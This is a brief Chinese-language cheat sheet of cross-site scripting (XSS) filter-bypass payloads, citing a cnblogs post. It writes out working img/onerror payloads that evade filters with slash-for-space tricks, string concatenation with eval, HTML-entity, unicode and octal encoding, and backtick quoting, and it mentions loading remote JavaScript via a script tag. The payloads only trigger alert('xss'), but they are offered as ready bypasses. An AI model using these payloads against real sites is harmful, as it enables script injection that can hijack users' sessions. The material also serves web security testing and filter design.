# XSS

[15178028.html](https://www.cnblogs.com/sfsec/p/15178028.html)
标签替换input,details
事件onfocus,onblur等

link包含远程js文件
<script src=>


有过滤
用/代替空格
```
<img/src="x"/onerror=alert("xss");>
```
双写

字符拼接
```
<img src="x" onerror="a=`aler`;b=`t`;c='(`xss`);';eval(a+b+c)">
```
编码绕过
unioncode
```
<img src="x" onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#34;&#120;&#115;&#115;&#34;&#41;&#59;">

<img src="x" onerror="eval('\u0061\u006c\u0065\u0072\u0074\u0028\u0022\u0078\u0073\u0073\u0022\u0029\u003b')">
```
八进制
```
<img src=x onerror=alert('\170\163\163')>
```

反引号替代单双引号


